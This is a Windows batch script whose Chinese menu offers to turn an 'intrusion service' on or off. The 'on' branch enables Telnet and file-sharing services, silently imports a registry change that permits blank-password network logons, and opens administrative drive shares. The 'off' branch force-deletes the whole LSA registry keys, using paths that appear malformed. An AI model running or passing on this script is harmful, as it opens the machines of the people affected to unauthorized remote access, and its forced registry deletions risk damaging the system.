@echo off 
set /p a=请选择[1:开启入侵服务或2:关闭入侵服务]
if %a%==1 (goto a ) else (goto b)
goto :eof
:a
@echo off 
sc config lanmanserver start= auto
sc start lanmanserver||net stop lanmanserver&net start lanmanserver
echo.

sc config lanmanworkstation start= auto
sc start lanmanworkstation||net stop lanmanworkstation&net start lanmanworkstation
echo.

sc config tlntsvr start= auto
sc start tlntsvr||net stop tlntsvr&net start tlntsvr
echo.

sc config LmHosts start= auto
sc start LmHosts||net stop LmHosts&net start LmHosts
echo.

echo Windows Registry Editor Version 5.00>open.reg
echo.>>open.reg
echo.>>open.reg
echo.>>open.reg
echo.>>open.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]>>open.reg
echo.&echo.>>open.reg
echo "limitblankpassworduse"=dword:00000000>>open.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa]>>open.reg
echo.&echo.>>open.reg
echo "limitblankpassworduse"=dword:00000000>>open.reg
regedit /s open.reg
del open.reg
net share d$
net share e$
net share f$
net share g$
net share h$
pause
exit
:b
net share d$ /delete
net share e$ /delete
net share f$ /delete
net share g$ /delete
net share h$ /delete

sc config lanmanserver start= disabled
sc stop lanmanserver

sc config lanmanworkstation start= disabled
sc stop lanmanworkstation

sc config LmHosts start=disabled
sc stop LmHosts

sc config tlntsvr start= disabled
sc stop tlntsvr

reg delete "[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]" /f
reg delete "[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa]" /f